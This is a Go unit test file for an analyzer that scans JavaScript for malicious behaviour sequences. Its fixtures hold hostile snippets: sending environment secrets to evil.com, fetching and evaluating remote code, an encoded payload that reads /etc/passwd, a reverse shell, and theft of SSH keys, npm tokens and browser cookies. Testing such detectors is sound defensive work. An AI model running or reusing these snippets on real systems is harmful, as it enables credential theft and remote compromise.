package analyzer

import (
	"strings"
	"testing"
)

func TestBehaviorSequenceAnalyzer_CredentialTheft(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const secrets = JSON.stringify(process.env);
fetch('https://evil.com/collect', {method: 'POST', body: secrets});
`
	findings := a.scanContent(content, "stealer.js")

	if len(findings) == 0 {
		t.Fatal("Expected to detect credential theft pattern")
	}

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Credential") || strings.Contains(f.Title, "exfiltration") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected CRITICAL severity for credential theft, got %v", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected credential theft finding")
	}
}

func TestBehaviorSequenceAnalyzer_DownloadAndExecute(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const payload = await fetch('https://evil.com/stage2.js').then(r => r.text());
eval(payload);
`
	findings := a.scanContent(content, "loader.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Download") || strings.Contains(f.Title, "execute") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected CRITICAL severity for download-and-execute")
			}
			break
		}
	}
	if !found {
		t.Error("Expected download-and-execute finding")
	}
}

func TestBehaviorSequenceAnalyzer_EncodedPayload(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const code = atob('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjYXQgL2V0Yy9wYXNzd2QiKQ==');
eval(code);
`
	findings := a.scanContent(content, "obfuscated.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Encoded") || strings.Contains(f.Title, "payload") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected encoded payload execution finding")
	}
}

func TestBehaviorSequenceAnalyzer_ReverseShell(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const net = require('net');
const cp = require('child_process');
const sh = cp.spawn('/bin/sh', []);
const client = new net.Socket();
client.connect(1337, 'evil.com', () => {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
});
`
	findings := a.scanContent(content, "shell.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Reverse shell") || strings.Contains(f.Title, "shell") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected CRITICAL severity for reverse shell")
			}
			break
		}
	}
	if !found {
		t.Error("Expected reverse shell finding")
	}
}

func TestBehaviorSequenceAnalyzer_SSHKeyTheft(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const fs = require('fs');
const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
`
	findings := a.scanContent(content, "keytheft.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "SSH") || strings.Contains(f.Title, "key theft") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected SSH key theft finding")
	}
}

func TestBehaviorSequenceAnalyzer_NPMTokenTheft(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const npmrc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
const token = npmrc.match(/_authToken=(.+)/)[1];
`
	findings := a.scanContent(content, "npm_stealer.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "npm") || strings.Contains(f.Title, "token") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected npm token theft finding")
	}
}

func TestBehaviorSequenceAnalyzer_RapidSequence(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	// Suspicious operations within 5 lines of each other
	content := `
const data = process.env.SECRET_KEY;
const encoded = Buffer.from(data).toString('base64');
fetch('https://evil.com', {body: encoded});
`
	findings := a.scanContent(content, "rapid.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Suspicious") && strings.Contains(f.Title, "network") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected rapid sequence detection finding")
	}
}

func TestBehaviorSequenceAnalyzer_BrowserDataTheft(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	content := `
const chromePath = os.homedir() + '/.config/google-chrome/Default/Cookies';
const cookies = fs.readFileSync(chromePath);
`
	findings := a.scanContent(content, "browser_steal.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Browser") || strings.Contains(f.Title, "data theft") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected browser data theft finding")
	}
}

func TestBehaviorSequenceAnalyzer_NoFalsePositive(t *testing.T) {
	a := NewBehaviorSequenceAnalyzer()
	// Legitimate looking code without dangerous combinations
	content := `
const config = require('./config.json');
console.log('Starting server on port', config.port);
const express = require('express');
const app = express();
app.listen(config.port);
`
	findings := a.scanContent(content, "server.js")

	// Should have no high/critical findings
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in benign code: %s", f.Title)
		}
	}
}
